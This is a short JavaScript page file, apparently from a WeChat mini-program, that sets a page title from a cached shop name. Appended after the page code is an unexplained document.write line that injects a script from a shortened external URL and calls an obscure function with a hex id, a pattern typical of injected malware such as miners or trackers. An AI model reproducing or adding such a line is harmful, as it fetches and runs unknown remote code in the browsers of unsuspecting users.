var t = getApp();
Page({
  data: {},
  onLoad: function (t) {
    console.log(t),
      this.setData({
        close: t.close,
        text: t.text
      })
  },
  onShow: function () {
    var e = t.getCache("sysset").shopname;
    wx.setNavigationBarTitle({
      title: e || "提示"
    })
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
